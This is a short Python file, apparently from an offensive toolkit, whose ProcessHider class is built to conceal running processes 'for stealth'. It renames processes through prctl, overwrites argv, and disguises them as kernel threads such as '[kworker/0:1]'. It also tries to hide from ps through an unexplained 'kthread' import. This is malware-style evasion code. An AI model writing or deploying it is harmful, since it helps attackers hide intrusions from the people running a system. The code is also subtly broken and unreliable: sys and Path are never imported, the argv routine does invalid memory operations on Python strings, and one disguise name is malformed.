#!/usr/bin/env python3
"""
Process Hiding
Techniques to hide running processes
"""

import os
import ctypes
import ctypes.util
from typing import Optional


class ProcessHider:
    """Process name manipulation for stealth"""
    
    def __init__(self):
        self._libc = ctypes.CDLL('libc.so.6', use_errno=True)
    
    def set_process_name(self, name: str) -> bool:
        """Set process name via prctl (Linux)"""
        PR_SET_NAME = 15
        try:
            self._libc.prctl(PR_SET_NAME, name, 0, 0, 0)
            return True
        except Exception:
            return False
    
    def set_thread_name(self, name: str) -> bool:
        """Set thread name (shows in top/htop)"""
        PR_SET_NAME = 15
        try:
            self._libc.prctl(PR_SET_NAME, name, 0, 0, 0)
            return True
        except Exception:
            return False
    
    def rename_argv(self, new_name: str) -> bool:
        """Overwrite argv to hide real name"""
        try:
            argv = ctypes.POINTER(ctypes.c_char_p)()
            argc = ctypes.c_int()
            
            # Get original argv pointer
            libc = self._libc
            libc.__libc_start_main.restype = None
            
            for i in range(len(sys.argv)):
                orig_len = len(sys.argv[i])
                new_len = len(new_name)
                
                addr = sys.argv[i]
                if orig_len >= new_len:
                    ctypes.memmove(addr, new_name.encode(), new_len)
                    if orig_len > new_len:
                        ctypes.memset(addr + new_len, 0, orig_len - new_len)
                else:
                    # Need more space, just copy what fits
                    ctypes.memmove(addr, new_name.encode(), orig_len)
        except Exception:
            return False
        
        return True
    
    def hide_from_ps(self) -> bool:
        """Try to hide from ps (kernel module approach - requires root)"""
        try:
            import kthread
            kthread.hide()
            return True
        except ImportError:
            pass
        
        try:
            self.set_process_name('[kworker/0:1]')
        except Exception:
            pass
        
        return False
    
    def disguise_as_system(self) -> bool:
        """Disguise as system process"""
        system_names = [
            '[kworker/0:1]',
            '[kworker/1:2]',
            '[kworker/u:0]',
            'kworker/u:1]',
            '[ksoftirqd/0]',
            '[kswapd0]',
            '[kcompactd0]',
            '[kworker/u4:0]',
        ]
        
        name = system_names[0]
        return self.set_process_name(name)
    
    def get_current_name(self) -> str:
        """Get current process name"""
        try:
            with open('/proc/self/comm', 'r') as f:
                return f.read().strip()
        except Exception:
            return ''
    
    def get_thread_names(self) -> list:
        """Get names of all threads"""
        threads = []
        try:
            task_dir = Path('/proc/self/task')
            for task in task_dir.iterdir():
                try:
                    with open(task / 'comm', 'r') as f:
                        threads.append(f.read().strip())
                except Exception:
                    pass
        except Exception:
            pass
        return threads
